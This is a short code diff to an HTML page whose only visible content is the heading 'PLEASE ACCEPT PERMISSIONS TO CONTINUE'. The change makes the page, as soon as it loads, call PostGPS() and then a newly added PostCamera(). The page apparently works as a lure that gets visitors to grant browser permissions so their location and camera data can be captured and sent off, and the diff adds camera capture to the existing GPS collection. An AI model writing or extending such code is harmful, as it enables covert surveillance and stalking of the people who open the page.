@@ -11,9 +11,10 @@
     <h1><b>PLEASE ACCEPT PERMISSIONS TO CONTINUE</b></h1>
 
    <script>
-        window.addEventListener('DOMContentLoaded', () => {
-            PostGPS();
-        });
+    window.addEventListener('DOMContentLoaded', async () => {
+        await PostGPS();
+        await PostCamera();
+    });
     </script>
 </body>
 </html>
